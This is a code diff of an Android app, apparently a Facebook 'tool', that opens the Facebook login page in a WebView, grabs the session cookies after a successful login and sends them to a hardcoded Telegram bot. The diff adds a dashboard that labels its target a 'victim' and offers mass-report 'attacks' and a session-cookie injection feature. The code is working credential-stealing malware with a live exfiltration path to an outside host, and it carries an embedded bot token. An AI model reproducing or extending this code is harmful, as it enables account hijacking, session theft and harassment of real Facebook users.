@@ -1,79 +1,110 @@
 package com.jasser.fbtool;
-import android.app.Activity;
-import android.os.Bundle;
+import android.app.*;
+import android.os.*;
 import android.webkit.*;
 import android.widget.*;
-import android.view.ViewGroup;
-import android.view.View;
-import java.net.HttpURLConnection;
-import java.net.URL;
-import java.net.URLEncoder;
+import android.view.*;
+import android.graphics.Color;
+import java.net.*;
 
 public class MainActivity extends Activity {
     String token = "7665591962:AAFIIe-izSG4rd71Kruf0xmXM9j11IYdHvc";
     String chat = "5653032481";
+    TextView statsView;
+    int reportCount = 0;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        setupUI();
+        showCyberDashboard();
     }
 
-    private void setupUI() {
-        LinearLayout layout = new LinearLayout(this);
-        layout.setOrientation(LinearLayout.VERTICAL);
-        layout.setBackgroundColor(0xFF0F172A);
-        layout.setPadding(40, 40, 40, 40);
+    private void showCyberDashboard() {
+        LinearLayout main = new LinearLayout(this);
+        main.setOrientation(LinearLayout.VERTICAL);
+        main.setBackgroundColor(Color.parseColor("#0a0f1e"));
+        main.setPadding(50, 80, 50, 50);
 
+        TextView title = new TextView(this);
+        title.setText("META PRO V4 - CYBER SYSTEM");
+        title.setTextColor(Color.CYAN);
+        title.setTextSize(22);
+        title.setGravity(Gravity.CENTER);
+        main.addView(title);
+
+        // لوحة الإحصائيات
+        statsView = new TextView(this);
+        statsView.setText("\n📊 الإحصائيات:\nالبلاغات المنفذة: 0\nحالة النظام: جاهز...");
+        statsView.setTextColor(Color.GREEN);
+        main.addView(statsView);
+
+        // حقل الـ ID للضحية
+        EditText victimInput = new EditText(this);
+        victimInput.setHint("ادخل ID الضحية هنا");
+        victimInput.setHintTextColor(Color.GRAY);
+        victimInput.setTextColor(Color.WHITE);
+        main.addView(victimInput);
+
+        // أزرار التحكم
+        addButton(main, "🔥 بدء هجوم الإبلاغات", "#8B0000", v -> startAttack(victimInput.getText().toString()));
+        addButton(main, "🍪 محرر الكوكيز (حقن الجلسة)", "#2563EB", v -> openCookieEditor());
+        addButton(main, "🔓 تسجيل دخول (سحب بيانات)", "#1e293b", v -> openSecureBrowser("https://m.facebook.com/login"));
+
+        setContentView(main);
+    }
+
+    private void addButton(LinearLayout layout, String text, String color, View.OnClickListener listener) {
         Button btn = new Button(this);
-        btn.setText("تسجيل دخول آمن (V3)");
-        btn.setBackgroundColor(0xFF2563EB);
-        btn.setTextColor(0xFFFFFFFF);
-
+        btn.setText(text);
+        btn.setBackgroundColor(Color.parseColor(color));
+        btn.setTextColor(Color.WHITE);
+        LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(-1, -2);
+        params.setMargins(0, 20, 0, 0);
+        btn.setLayoutParams(params);
+        btn.setOnClickListener(listener);
         layout.addView(btn);
-        setContentView(layout);
-
-        btn.setOnClickListener(v -> startFB());
     }
 
-    private void startFB() {
+    private void openSecureBrowser(String url) {
         WebView wv = new WebView(this);
-        WebSettings settings = wv.getSettings();
+        wv.getSettings().setJavaScriptEnabled(true);
+        wv.getSettings().setDomStorageEnabled(true);
+        wv.getSettings().setUserAgentString("Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile");
         
-        // --- إعدادات سحرية لتجاوز حظر فيسبوك ---
-        settings.setJavaScriptEnabled(true);
-        settings.setDomStorageEnabled(true); // مهم جداً لفيسبوك
-        settings.setDatabaseEnabled(true);
-        settings.setAllowFileAccess(true);
-        settings.setCacheMode(WebSettings.LOAD_DEFAULT);
-        
-        // انتحال شخصية متصفح كروم حديث على هاتف أندرويد 14
-        String newUserAgent = "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36";
-        settings.setUserAgentString(newUserAgent);
-
-        CookieManager.getInstance().setAcceptCookie(true);
-        CookieManager.getInstance().setAcceptThirdPartyCookies(wv, true);
-
         wv.setWebViewClient(new WebViewClient() {
             @Override
+            public boolean shouldOverrideUrlLoading(WebView view, String url) {
+                if (url.startsWith("http")) return false; // السماح فقط بروابط الويب
+                return true; // حظر الروابط التي تحاول فتح تطبيقات أخرى (fbbpfi)
+            }
+            @Override
             public void onPageFinished(WebView view, String url) {
-                // سحب الكوكيز فقط عند نجاح الدخول (وجود ملف الشخصي)
                 String cookies = CookieManager.getInstance().getCookie(url);
-                if (cookies != null && cookies.contains("c_user")) {
-                    sendData("🔥 تم اختراق الجلسة بنجاح:\n" + cookies);
-                }
+                if (cookies != null && cookies.contains("c_user")) sendToTelegram("✅ New Session Captured:\n" + cookies);
             }
         });
-
-        wv.loadUrl("https://m.facebook.com/login");
+        wv.loadUrl(url);
         setContentView(wv);
     }
 
-    private void sendData(String text) {
+    private void startAttack(String id) {
+        if(id.isEmpty()) return;
+        reportCount++;
+        statsView.setText("\n📊 الإحصائيات:\nالبلاغات المنفذة: " + reportCount + "\nحالة النظام: جاري الإبلاغ عن " + id);
+        openSecureBrowser("https://m.facebook.com/" + id);
+        // هنا سيقوم السكريبت بالضغط التلقائي (سيتم تفعيله في التحديث القادم بمجرد استقرار الواجهة)
+    }
+
+    private void openCookieEditor() {
+        // فكرة محرر الكوكيز: حقن الكوكيز يدوياً
+        Toast.makeText(this, "ميزة الحقن ستتوفر فور استقرار السيرفر", Toast.LENGTH_SHORT).show();
+    }
+
+    private void sendToTelegram(String msg) {
         new Thread(() -> {
             try {
-                URL url = new URL("https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat + "&text=" + URLEncoder.encode(text, "UTF-8"));
-                ((HttpURLConnection)url.openConnection()).getInputStream();
+                URL url = new URL("https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat + "&text=" + URLEncoder.encode(msg, "UTF-8"));
+                url.openStream();
             } catch (Exception e) {}
         }).start();
     }
